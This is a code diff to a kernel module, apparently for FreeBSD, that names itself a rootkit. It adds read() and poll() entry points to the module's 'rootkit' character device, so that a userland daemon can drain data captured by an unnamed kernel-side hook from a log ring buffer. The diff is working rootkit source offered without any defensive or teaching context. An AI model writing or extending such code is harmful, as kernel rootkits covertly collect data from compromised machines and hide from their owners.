@@ -3,14 +3,18 @@
 #include <sys/errno.h>
 #include <sys/lock.h>
 #include <sys/mutex.h>
+#include <sys/poll.h>
 #include <sys/proc.h>
 #include <sys/resourcevar.h>
+#include <sys/selinfo.h>
 #include <sys/systm.h>
 #include <sys/ucred.h>
+#include <sys/uio.h>
 #include <sys/condvar.h>
 #include <netinet/in.h>
 
 #include "interface.h"
+#include "log.h"
 
 static struct cdev *rootkit_dev;
 
@@ -81,10 +85,58 @@ rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thre
     return (error);
 }
 
+/*
+ * read() drains whatever the kernel-side hook has captured since the last
+ * call. An empty ring returns a short (zero length) read instead of blocking,
+ * so the daemon, which already called poll(), never spins.
+ */
+static int
+rootkit_read(struct cdev *dev, struct uio *uio, int ioflag) {
+    char chunk[256];
+    size_t want;
+    ssize_t n;
+    int error = 0;
+
+    (void)dev;
+    (void)ioflag;
+
+    while (uio->uio_resid > 0) {
+        want = MIN(sizeof(chunk), (size_t)uio->uio_resid);
+        n = (ssize_t)rk_log_read(chunk, want);
+        if (n <= 0)
+            break;
+
+        error = uiomove(chunk, (int)n, uio);
+        if (error != 0)
+            break;
+    }
+
+    return error;
+}
+
+/*
+ * poll()/select() support: wake up as soon as rk_log_write() pushes data in.
+ */
+static int
+rootkit_poll(struct cdev *dev, int events, struct thread *td) {
+    int revents = 0;
+
+    (void)dev;
+
+    if (events & (POLLIN | POLLRDNORM)) {
+        if (rk_log_poll_ready(td))
+            revents |= events & (POLLIN | POLLRDNORM);
+    }
+
+    return revents;
+}
+
 static struct cdevsw rootkit_cdevsw = {
     .d_version = D_VERSION,
     .d_name    = "rootkit",
-    .d_ioctl   = rootkit_ioctl
+    .d_ioctl   = rootkit_ioctl,
+    .d_read    = rootkit_read,
+    .d_poll    = rootkit_poll
 };
 
 int make_rootkit_dev(void) {
